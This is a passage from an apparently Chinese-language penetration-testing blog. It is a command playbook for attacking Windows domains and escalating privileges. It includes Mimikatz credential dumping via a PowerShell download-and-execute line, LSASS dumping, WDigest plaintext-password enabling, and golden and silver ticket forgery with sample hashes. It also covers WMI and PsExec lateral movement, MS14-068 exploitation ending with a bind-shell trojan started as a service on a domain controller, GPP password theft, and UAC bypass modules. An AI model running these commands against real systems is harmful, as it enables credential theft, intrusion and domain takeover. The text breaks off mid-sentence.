title="powershell"></a>powershell</h3><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs powershell">kali开启http<br>Python <span class="hljs-literal">-m</span> SimpleHTTPServer <span class="hljs-number">80</span><br>远程调用<br>powershell <span class="hljs-built_in">IEX</span> (<span class="hljs-built_in">New-Object</span> Net.WebClient).DownloadString(<span class="hljs-string">&#x27;ip/Invoke-Mimikatz.ps1&#x27;</span>);<span class="hljs-built_in">Invoke-Mimikatz</span><br></code></pre></td></tr></table></figure><h3 id="lsass-dmp"><a href="#lsass-dmp" class="headerlink" title="lsass.dmp"></a>lsass.dmp</h3><p>导出：</p><p>任务管理器</p><p>procdump</p><figure class="highlight vim"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs vim">procdump.<span class="hljs-keyword">exe</span> -accepteula -<span class="hljs-keyword">ma</span> lsass.<span class="hljs-keyword">exe</span> lsass.dmp<br></code></pre></td></tr></table></figure><p>mimikatz</p><figure class="highlight avrasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs avrasm"><span class="hljs-symbol">sekurlsa:</span>:minidump lsass.DMP    <span class="hljs-meta">#看到Switch to MINIDUMP 加载成功</span><br><span class="hljs-symbol">sekurlsa:</span>:logonPasswords full    <span class="hljs-meta">#导出密码散列值</span><br></code></pre></td></tr></table></figure><h2 id="Wdigest-明文抓取"><a href="#Wdigest-明文抓取" class="headerlink" title="Wdigest 明文抓取"></a>Wdigest 明文抓取</h2><p><img src="/2024/06/27/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/BhYsbhulCo6zlGx43RLcxLgonKh.png" alt="截图"></p><figure class="highlight dockerfile"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs dockerfile"><span class="hljs-comment">#开启</span><br>reg <span class="hljs-keyword">add</span><span class="language-bash"> HKLM\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest /v UseLogonCredential /t REG_DWORD /d 1 /f</span><br><span class="hljs-comment">#关闭</span><br>reg <span class="hljs-keyword">add</span><span class="language-bash"> HKLM\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest /v UseLogonCredential /t REG_DWORD /d 0 /f</span><br></code></pre></td></tr></table></figure><p>调整为 1 后重启即可查看明文密码（权限维持可用）</p><h2 id="暴力"><a href="#暴力" class="headerlink" title="暴力"></a>暴力</h2><p>Hashcat 爆破</p><p>在线破解</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs awk">https:<span class="hljs-regexp">//</span>www.objectif-securite.ch<span class="hljs-regexp">/en/</span>ophcrack<br>https:<span class="hljs-regexp">//</span>www.cmd5.com/<br>http:<span class="hljs-regexp">//</span>www.xmd5.com/<br></code></pre></td></tr></table></figure><h2 id="-1"><a href="#-1" class="headerlink" title=""></a></h2><h2 id="黄金票据"><a href="#黄金票据" class="headerlink" title="黄金票据"></a>黄金票据</h2><h3 id="知识点"><a href="#知识点" class="headerlink" title="知识点"></a>知识点</h3><blockquote><p>在 Kerberos 认证中，Client 通过 AS（身份认证服务）认证后，AS 会给 Client 一个 Logon Session Key 和 TGT，而 Logon Session Key 并不会保存在 KDC 中，krbtgt 的 NTLM Hash 又是固定的，所以只要得到 krbtgt 的 NTLM Hash，就可以伪造 TGT 和 Logon Session Key 来进入下一步 Client 与 TGS 的交互。而已有了金票后，就跳过 AS 验证，不用验证账户和密码，所以也不担心域管密码修改。</p></blockquote><h3 id="条件"><a href="#条件" class="headerlink" title="条件"></a>条件</h3><blockquote><p>需要伪造的域管理员用户名<br>完整的域名<br>域 SID<br>krbtgt 的 NTLM Hash</p></blockquote><h3 id="信息收集-1"><a href="#信息收集-1" class="headerlink" title="信息收集"></a>信息收集</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs bash">一.<br>klist purge    <span class="hljs-comment">#windows命令行下清除票据</span><br>net config workstation   <span class="hljs-comment">#获取登录域</span><br>nltest /dsgetdc:域名  <span class="hljs-comment">#获取主机</span><br></code></pre></td></tr></table></figure><figure class="highlight arcade"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs arcade">二.抓NTLM <span class="hljs-built_in">Hash</span><br>mimikatz.exe<br>privilege::debug<br>lsadump::dcsync /<span class="hljs-built_in">domain</span>:工作域 /<span class="hljs-built_in">all</span> /csv<br></code></pre></td></tr></table></figure><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs pgsql">三.查看krbtgt用户的SID<br>法<span class="hljs-number">1</span> lsadump::dcsync /<span class="hljs-keyword">domain</span>:工作域 /<span class="hljs-keyword">user</span>:krbtgt<br>法<span class="hljs-number">2</span> wmic useraccount <span class="hljs-keyword">get</span> <span class="hljs-type">name</span>,sid<br></code></pre></td></tr></table></figure><h3 id="生成票据"><a href="#生成票据" class="headerlink" title="生成票据"></a>生成票据</h3><p>mimikatz.exe “kerberos::golden &#x2F;admin:systest &#x2F;domain:xiyou.dayu.com &#x2F;sid:S-1-5-21-1816246241-4074331134-2257350442 &#x2F;krbtgt:39601ebdad1d3e960ed3712398d3ab3a &#x2F;ticket:ticket.kirbi” exit</p><figure class="highlight jboss-cli"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs jboss-cli"><span class="hljs-string">/admin</span>：伪造的用户名（任意）<br><span class="hljs-string">/domain</span>：域名称<br><span class="hljs-string">/sid</span>：SID值，注意是去掉最后一个-后面的值<br><span class="hljs-string">/krbtgt</span>：krbtgt的HASH值<br><span class="hljs-string">/ticket</span>：生成的票据名称    <span class="hljs-string">//</span>不是写入内存中的命令<br></code></pre></td></tr></table></figure><p>注入</p><figure class="highlight arduino"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs arduino">kerberos::purge<br>kerberos::ptt 票据名<br></code></pre></td></tr></table></figure><h2 id="白银票据"><a href="#白银票据" class="headerlink" title="白银票据"></a>白银票据</h2><h3 id="知识点-1"><a href="#知识点-1" class="headerlink" title="知识点"></a>知识点</h3><blockquote><p>在 Kerberos 认证的第三步，Client 带着 ST 和 Authenticator3 向 Server 上的某个服务进行请求，Server 接收到 Client 的请求之后,通过自己的 Master Key 解密 ST，从而获得 Session Key。通过 Session Key 解密 Authenticator3，进而验证对方的身份，验证成功就让 Client 访问 server 上的指定服务了。 —&gt; 通过 Server 用户 Hash 伪造一个 ST</p></blockquote><h3 id="条件-1"><a href="#条件-1" class="headerlink" title="条件"></a>条件</h3><blockquote><p>域名<br>域 SID(test)<br>目标服务器的 FQDN<br>可利用的服务<br>服务账号的 NTLM Hash<br>要伪造的用户名</p></blockquote><h3 id="信息收集-2"><a href="#信息收集-2" class="headerlink" title="信息收集"></a>信息收集</h3><figure class="highlight arcade"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs arcade">net config workstation 获取工作域<br>nltest /dsgetdc:域名  获取主机名<br>Whoami /<span class="hljs-built_in">all</span>  SID<br>mimikatz.exe <span class="hljs-string">&quot;privilege::debug&quot;</span> <span class="hljs-string">&quot;sekurlsa::logonpasswords&quot;</span> <span class="hljs-string">&quot;exit&quot;</span>&gt;<span class="hljs-built_in">log</span>.txt 获取NTML <span class="hljs-built_in">hash</span><br></code></pre></td></tr></table></figure><p>生成票据<br>kerberos::golden &#x2F;domain:xiyou.dayu.com &#x2F;sid:S-1-5-21-1816246241-4074331134-2257350442 &#x2F;target:xiyou.xiyou.dayu.com &#x2F;service:cifs &#x2F;rc4:f5369b5accc878d9eedfcde13578e2fc &#x2F;user:testw &#x2F;ptt</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs bash">/domain：域名<br>/sid：域的SID值<br>/target: 域控制器全称即FQDN<br>/service: 需要指定相关的服务名，此处为cifs<br>/rc4: 域控的计算机账户ntlm <span class="hljs-built_in">hash</span><br>/user: 要伪造的用户名，任意填写<br></code></pre></td></tr></table></figure><p><img src="/2024/06/27/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/PdHnbjpPXoIfJDxA4cqc5Gc2nig.png" alt="截图"></p><h2 id="RDP-协议"><a href="#RDP-协议" class="headerlink" title="RDP 协议"></a>RDP 协议</h2><p>① 查询注册表确定是否主机开启了远程桌面</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">reg</span> query <span class="hljs-string">&quot;HKLM\SYSTEM\CurrentControlSet\Control\Terminal Server&quot;</span> /v fDenyTSConnections <br><span class="hljs-attribute">ps</span>: 若字段值为<span class="hljs-number">0</span>，则表示已启动RDP；若为<span class="hljs-number">1</span>，则表示禁用RDP<br></code></pre></td></tr></table></figure><p>  ② 开启远程桌面</p><figure class="highlight dockerfile"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs dockerfile">reg <span class="hljs-keyword">add</span><span class="language-bash"> <span class="hljs-string">&quot;HKLM\SYSTEM\CurrentControlSet\Control\Terminal Server&quot;</span> /v fDenyTSConnections /t REG_DWORD /d 0 /f</span><br></code></pre></td></tr></table></figure><p>  ③ 关闭“仅允许运行使用网络级别身份验证的远程桌面的计算机连接”（鉴权）</p><figure class="highlight dockerfile"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs dockerfile">reg <span class="hljs-keyword">add</span><span class="language-bash"> <span class="hljs-string">&quot;HKLM\SYSTEM\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp&quot;</span> /v UserAuthentication /t REG_DWORD /d 0</span><br></code></pre></td></tr></table></figure><p>  ④ 设置防火墙策略放行 3389 端口</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs routeros">netsh advfirewall<span class="hljs-built_in"> firewall </span><span class="hljs-built_in">add</span> rule <span class="hljs-attribute">name</span>=<span class="hljs-string">&quot;Remote Desktop&quot;</span> <span class="hljs-attribute">protocol</span>=TCP <span class="hljs-attribute">dir</span>=in <span class="hljs-attribute">localport</span>=338<br></code></pre></td></tr></table></figure><h3 id="RDP-Hijack"><a href="#RDP-Hijack" class="headerlink" title="RDP Hijack"></a><strong>RDP Hijack</strong></h3><p>  Windows 系统下，tscon 可被用来切换远程桌面的会话。正常情况下，切换会话时需要提供登录密码，但通过特殊的利用方法能够绕过验证，不输入密码实现未授权登录。<br>  可以通过 <code>query user</code> 来列出所有登录的用户列表，得到 id<br>  在 SYSTEM 权限下，使用 <code>tscon &lt;ID&gt;</code> 来切换用户不需要验证密码。</p><h3 id="sharp-RDP"><a href="#sharp-RDP" class="headerlink" title="sharp RDP"></a><a href="https://github.com/0xthirteen/SharpRDP">sharp RDP</a></h3><p>  sharp rdp 可以通过远程桌面协议在远程主机上执行系统命令，且不需要 GUI 客户端。</p><p>  工具需要远程主机开启远程桌面功能，且防火墙放行 3389 端口</p><h2 id="WMI"><a href="#WMI" class="headerlink" title="WMI"></a>WMI</h2><p>windows 自带一个工具集，默认不产生日志</p><p>WMI（Windows 管理规范）是一项核心的 Windows 管理技术。用户可以通过 WMI 管理本地和远程主机。<br>Windows 为传输 WMI 数据提供了两个可用的协议：分布式组件对象模型（DCOM）和 Windows 远程管理（WinRM）使得 WMI 对象的查询、事件注册、WMI 类方法的执行和类的创建等操作都能远程运行。</p><h3 id="利用方法"><a href="#利用方法" class="headerlink" title="利用方法"></a><strong>利用方法</strong></h3><ol><li>通过调用 WMI 的类方法进行远程调用，如 Win32_Process 类中的 Create 方法可以在远程主机上创建进程，Win32_Product 类的 Install 方法可以在远程主机上安装恶意的 MSI</li><li>远程部署 WMI 事件订阅，在特定事件发生时触发</li></ol><h3 id="条件-2"><a href="#条件-2" class="headerlink" title="条件"></a><strong>条件</strong></h3><p>1.远程主机的 WMI 服务为开启状态（默认开启）</p><p>2.远程主机防火墙放行 135 端口，这是 WMI 管理的默认端口</p><h3 id="利用步骤"><a href="#利用步骤" class="headerlink" title="利用步骤"></a><strong>利用步骤</strong></h3><p>1.通过 WMI 查询远程主机上运行的进程信息</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">wmic <span class="hljs-regexp">/node:192.168.1.131 /u</span>ser:Administrator <span class="hljs-regexp">/password:123456@ process list brief # /</span>node 执行远程主机的地址<br></code></pre></td></tr></table></figure><p>2.创建远程进程<br>通过调用 Win32_Process.Create 方法在远程主机上创建进程，启动 CMD 来执行命令<br>由于 WMIC 在执行命令时没有回显，因此可以将执行结果写入文件，然后通过别的方式读取文件</p><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs pgsql">wmic /node:<span class="hljs-number">192.168</span><span class="hljs-number">.1</span><span class="hljs-number">.131</span> /<span class="hljs-keyword">user</span>:Administrator /<span class="hljs-keyword">password</span>:<span class="hljs-number">123456</span>@ process <span class="hljs-keyword">call</span> <span class="hljs-keyword">create</span> &quot;cmd.exe /c ipconfig &gt; C:\result.txt&quot;<br></code></pre></td></tr></table></figure><p>3.远程安装 MSI 文件<br>通过调用 Win32_Product.Install 方法，可以控制远程主机安装恶意 MSI 文件，从而获得权限</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">wmic /node:192.168.1.131 /user:Administrator /password:123456@ product call instal<br></code></pre></td></tr></table></figure><h2 id="SMB-横向"><a href="#SMB-横向" class="headerlink" title="SMB 横向"></a><strong>SMB 横向</strong></h2><p>  SMB（服务器消息块），又称 CIFS（网络文件共享系统），主要功能是使网络上的计算机能够共享计算机文件、打印机、串行端口和通信等资源。<br>  客户端与服务器建立连接后,客户端可以向服务器发送 SMB 命令允许用户访问共享、打开、读取或者是写入文件。<br>  SMB 消息一般使用 NetBIOS 协议或 TCP 发送，分别使用端口 139 或 445，目前倾向于使用 445 端口。</p><h3 id="利用条件-1"><a href="#利用条件-1" class="headerlink" title="利用条件"></a><strong>利用条件</strong></h3><ol><li>445 端口开放</li><li>知道账号密码</li></ol><h3 id="利用步骤-1"><a href="#利用步骤-1" class="headerlink" title="利用步骤"></a><strong>利用步骤</strong></h3><p>1.建立 IPC 链接，psexec 需要明文或 hash 传递</p><figure class="highlight nginx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs nginx"><span class="hljs-attribute">net</span> use \\<span class="hljs-number">192.168.3.32</span>\ipc$ <span class="hljs-string">&quot;admin!@#45&quot;</span> /user:administrator<br>psexec \\<span class="hljs-number">192.168.3.32</span> -s cmd       //需要先有 ipc 链接 -s 以 System 权限运行<br></code></pre></td></tr></table></figure><p>2.或者不用建立 IPC 直接提供明文账户密码</p><figure class="highlight nginx"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs nginx"><span class="hljs-attribute">psexec</span> \\<span class="hljs-number">192.168.3.21</span> -u administrator -p Admin12345 -s cmd<br></code></pre></td></tr></table></figure><h2 id="MS14-068攻击"><a href="#MS14-068攻击" class="headerlink" title="MS14-068攻击"></a><a href="https://github.com/abatchy17/WindowsExploits/tree/master/MS14-068">MS14-068</a><strong>攻击</strong></h2><p>  MS14-068 基于漏洞，造成的危害是允许域内任何一个普通用户，将自己提升至域管权限。</p><p>  Windows 域中使用 kerberos 协议过程中，为了让服务器判断 Client 是否有权限访问服务，微软在 Windows 平台上在 Kerberos 协议中增加了 PAC（Privilege Attribute Certificate）特权属性证书，也就是这个 PAC 造成了 MS14-068 这个漏洞。</p><p>  PAC 是用来验证 Client 的访问权限的，它会被放在 TGT 里发送给 Client，然后由 Client 发送给 TGS。</p><p>  漏洞允许经过身份验证的用户在其 Kerberos 票证（TGT）中插入任意的 PAC（表示所有用户权限的结构）。该漏洞位于 kdcsvc.dll 域控制器的密钥分发中心(KDC)中。普通用户可以通过呈现具有改变了 PAC 的 Kerberos TGT 来获得票证，进而伪造票据获得管理员权限。</p><h3 id="条件-3"><a href="#条件-3" class="headerlink" title="条件"></a><strong>条件</strong></h3><p>    1. 域内任意用户 SID</p><pre><code class="hljs">      2. 域内任意用户密码</code></pre><h3 id="攻击流程"><a href="#攻击流程" class="headerlink" title="攻击流程"></a><strong>攻击流程</strong></h3><p>    1. 获得一个域用户 douser 的 SID</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">whoami</span> /all<br></code></pre></td></tr></table></figure><p>    2. 上传工具 ms14-068.exe，并执行命令生成 TGT 票据</p><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs stylus">ms14-<span class="hljs-number">068</span><span class="hljs-selector-class">.exe</span> -u 域成员名@域名 -s 域成员sid -d 域控制器ip地址 -<span class="hljs-selector-tag">p</span> 域成员密码<br></code></pre></td></tr></table></figure><p>    3. 上传 mimikatz，利用 mimikatz 将票据注入到当前内存中伪造凭证</p><figure class="highlight 1c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs 1c">mimikatz <span class="hljs-meta"># kerberos::purge          <span class="hljs-comment">//清空当前机器中所有凭证，如果有域成员凭证会影响凭证伪造</span></span><br>mimikatz <span class="hljs-meta"># kerberos::list           <span class="hljs-comment">//查看当前机器凭证</span></span><br>mimikatz <span class="hljs-meta"># kerberos::ptc 票据文件   <span class="hljs-comment">//将票据注入到内存中</span></span><br></code></pre></td></tr></table></figure><p>    4. 使用 net use 进行登录或者使用 psexec，wmi 等方法进行远程执行命令</p><figure class="highlight stata"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs stata"><span class="hljs-keyword">net</span> <span class="hljs-keyword">use</span> \\<span class="hljs-keyword">WIN</span>-ENS2VR5TR3N           <span class="hljs-comment">//登录域控</span><br></code></pre></td></tr></table></figure><p>    5. 上传一个正向的 msf 马，并将该木马 copy 到域控上去执行</p><figure class="highlight stata"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs stata"><span class="hljs-keyword">copy</span> c:\windows\system32\<span class="hljs-keyword">shell</span>.exe \\<span class="hljs-keyword">WIN</span>-ENS2VR5TR3N\c$<br></code></pre></td></tr></table></figure><p>    6. 通过 sc 远程对域控创建服务来启动木马</p><figure class="highlight mipsasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs mipsasm"><span class="hljs-keyword">sc </span>\\WIN-ENS2VR5TR3N create <span class="hljs-keyword">bindshell </span><span class="hljs-keyword">binpath= </span><span class="hljs-string">&quot;c:\shell.exe&quot;</span><br><span class="hljs-keyword">sc </span>\\WIN-ENS2VR5TR3N start <span class="hljs-keyword">bindshell</span><br></code></pre></td></tr></table></figure><h2 id="其他"><a href="#其他" class="headerlink" title="其他"></a>其他</h2><h3 id="PsExec"><a href="#PsExec" class="headerlink" title="PsExec"></a>PsExec</h3><p>起初用于运维，基本原理是通过管道在远程目标机器上创建一个 psexec 服务，并在本地磁盘中生成一个名为“PSEXESVC”的进制文件，通过 psexec 服务运行命令，运行结束后删除（大量日志）</p><h4 id="Pth-winexe"><a href="#Pth-winexe" class="headerlink" title="Pth-winexe"></a>Pth-winexe</h4><h4 id="smbexec"><a href="#smbexec" class="headerlink" title="smbexec"></a>smbexec</h4><h1 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h1><h2 id="Linux"><a href="#Linux" class="headerlink" title="Linux"></a>Linux</h2><ol><li>suid 提权 (find &#x2F; -perm -u&#x3D;s -type f 2&gt;&#x2F;dev&#x2F;null)</li></ol><p>常规，strings&#x2F;strace 追踪调用函数配合共享库注入&#x2F;修改 path 劫持</p><p>bash&lt;4.2 路径组合自定义函数</p><p><img src="/2024/06/27/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/JBFlbtySzoDfSdxTvXrchtPLnFf.png" alt="截图"></p><p>bash&lt;4.4 环境变量劫持</p><p><img src="/2024/06/27/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/AfB0b898oovlYXxpkAwcPMCTnye.png" alt="截图"></p><ol><li>sudo 提权</li></ol><p>git help config （!&#x2F;bin&#x2F;bash 或者 ！’sh’）完成提权</p><p>sudo 命令利用 env+&#x3D;LD_PRELOAD 提权</p><p><img src="/2024/06/27/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/LWSIbTRrJovgeQxvbY7cIY8Jnqb.png" alt="截图"></p><p><img src="/2024/06/27/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/Uljwba9S8oB3aOxR3CvcpQGnnNc.png" alt="截图"></p><ol><li>内核提权</li><li>自动任务提权</li></ol><p>常规修改 sh 文件，相对路径劫持，配合 sh 文件内的命令</p><ol><li>docker 提权</li><li>Passwd&#x2F;shadow 提权</li></ol><p>shadow 解密或者手动生成 passwd&#x2F;shadow 密文</p><p>7.NFS 提权</p><h2 id="windows"><a href="#windows" class="headerlink" title="windows"></a><strong>windows</strong></h2><h3 id="系统漏洞提权"><a href="#系统漏洞提权" class="headerlink" title="系统漏洞提权"></a>系统漏洞提权</h3><p>通过 Webshell 命令行执行 systeminfo 命令查看系统是否打了提权补丁，可使用 exp 进行提权<br>通过 Webshell 找网站读写执行目录，把 cs 马或提权 exp 上传到对方服务器（如果 cmd 无法执行命令可单独上传 cmd.exe 到对方服务器，菜刀终端设置为 setpc:\XXX\cmd.exe）</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs awk"><span class="hljs-comment">#手工查找补丁情况</span><br>systeminfo<br>Wmic qfe get Caption,Description,HotFixID,InstalledOn<br><br><span class="hljs-comment">#MSF后渗透扫描</span><br>post<span class="hljs-regexp">/windows/g</span>ather/enum_patches<br>post<span class="hljs-regexp">/multi/</span>recon/local_exploit_suggester<br><br><span class="hljs-comment">#windows exploit suggester</span><br>https:<span class="hljs-regexp">//gi</span>thub.com<span class="hljs-regexp">/AonCyberLabs/</span>Windows-Exploit-Suggester<br><br><span class="hljs-comment">#powershell中的sherlock脚本</span><br>Import-Module C:\Sherlock.ps1 <span class="hljs-comment">#下载ps1脚本，导入模块</span><br>Find-AllVulns<br><br><span class="hljs-comment">#Empire内置模块 Empire框架也提供了关于内核溢出漏洞提权的漏洞利用方法</span><br>usemodule privesc<span class="hljs-regexp">/powerup/</span>allchecks<br>execute<br><br>其他工具<br>WES-NG<br>Sherlock<br></code></pre></td></tr></table></figure><p>exp 在线查询</p><blockquote><p><a href="https://github.com/SecWiki/windows-kernel-exploits">https://github.com/SecWiki/windows-kernel-exploits</a><br><a href="https://bugs.hacking8.com/tiquan/">https://bugs.hacking8.com/tiquan/</a><br><a href="https://github.com/Heptagrams/Heptagram/tree/master/Windows/Elevation">https://github.com/Heptagrams/Heptagram/tree/master/Windows/Elevation</a><br><a href="https://www.exploit-db.com/">https://www.exploit-db.com/</a><br><a href="https://i.hacking8.com/tiquan/">https://i.hacking8.com/tiquan/</a></p></blockquote><h3 id="组策略首选项"><a href="#组策略首选项" class="headerlink" title="组策略首选项"></a>组策略首选项</h3><blockquote><p>SYSVOL 是 AD(活动目录)里面一个存储域公共文件<a href="https://cloud.tencent.com/act/pro/promotion-cvm?from_column=20065&from=20065">服务器</a>副本的共享文件夹，所有的认证用户都可以读取。SYSVOL 包括登录脚本，组策略数据，以及其他域控所需要的域数据，这是因为 SYSVOL 能在所有域控里进行自动同步和共享。</p></blockquote><p>路径为：\<DOMAIN>\SYSVOL&lt;DOMAIN&gt;\Policies\</p><p><strong>组策略偏好 GPP</strong></p><blockquote><p>win2008 发布了 GPP(Group Policy Preferences)，其中 GPP 最有用的特性，是在某些场景存储和使用凭据，其中包括：映射驱动（Drives.xml）创建本地用户数据源（DataSources.xml）打印机配置（Printers.xml）创建&#x2F;更新服务（Services.xml）计划任务（ScheduledTasks.xml）更改本地 Administrator 密码<br>为方便对所有机器进行操作，网络管理员会使用域策略进行统一的配置和管理，那么所有机器的本地管理员密码就是一样的，造成了即使不知道密码的情况下也能修改组策略首选项的密码，也可以通过脚本破解组策略首选项文件中密码的漏洞。</p></blockquote><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs awk"><span class="hljs-comment">#Powershell获取cpassword</span><br>Get-GPPPassword.ps1<br><br><span class="hljs-comment">#PowerSploit 的 Get-GPPPassword模块 检索通过组策略首选项推送的帐户的明文密码和其他信息。</span><br>powershell <span class="hljs-string">&quot;IEX (New-Object Net.WebClient).DownloadString(&#x27;https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Exfiltration/Get-GPPPassword.ps1&#x27;);Get-GPPPassword&quot;</span>Import-Module .\Get-GPPPassword.ps1;Get-GPPPassword<br>kali gpp-decrypt命令破解密码<br><br><span class="hljs-comment">#Msf</span><br>run post<span class="hljs-regexp">/windows/g</span>ather<span class="hljs-regexp">/credentials/g</span>pp<br><br><span class="hljs-comment">#Empire</span><br>usemodule privesc/gpp<br></code></pre></td></tr></table></figure><p>Bypass UAC</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><code class="hljs awk"><span class="hljs-comment">#Msf</span><br>exploit<span class="hljs-regexp">/windows/</span>local/ask       <span class="hljs-comment">#弹出UAC确认窗口，点击后获得system权限</span><br><br>exploit<span class="hljs-regexp">/windows/</span>local/bypassuac  <span class="hljs-comment">#此模块将通过进程注入使用可信任发布者证书绕过Windows UAC，它将生成关闭UAC标志的第二个shell。</span><br><br>exploit<span class="hljs-regexp">/windows/</span>local/bypassuac_injection <span class="hljs-comment">#此模块将通过进程注入使用可信任的发布者证书绕过Windows UAC。它将生成关闭UAC标志的第二个shell。在普通技术中，该模块使用反射式DLL注入技术并只除去了DLL payload 二进制文件，而不是三个单独的二进制文件。但是，它需要选择正确的体系架构（对于SYSWOW64系统也使用x64）。如果指定exe::custom，应在单独的进程中启动 payload 后调用ExitProcess（）</span><br><br><br>exploit<span class="hljs-regexp">/windows/</span>local/bypassuac_fodhelper<span class="hljs-comment">#此模块将通过在当前用户配置单元下劫持注册表中的特殊键并插入将在启动Windows fodhelper.exe应用程序时调用的自定义命令来绕过Windows 10 UAC。它将生成关闭UAC标志的第二个shell。此模块修改注册表项，但在调用payload后将清除该项。该模块不需要payload的体系架构和操作系统匹配。如果指定exe:custom，则应在单独的进程中启动payload后调用ExitProcess（）。</span><br><br>exploit<span class="hljs-regexp">/windows/</span>local/bypassuac_eventvwr<span class="hljs-comment">#此模块将通过在当前用户配置单元下劫持注册表中的特殊键并插入将在启动Windows事件查看器时调用的自定义命令来绕过Windows UAC。它将生成关闭UAC标志的第二个shell。此模块修改注册表项，但在调用payload后将清除该项。该模块不需要payload的体系架构和操作系统匹配。如果指定EXE ::Custom，则应在单独的进程中启动payload后调用ExitProcess（）</span><br><br>exploit<span class="hljs-regexp">/windows/</span>local/bypassuac_comhijack<span class="hljs-comment">#此模块将通过在hkcu配置单元中创建COM处理程序注册表项来绕过Windows 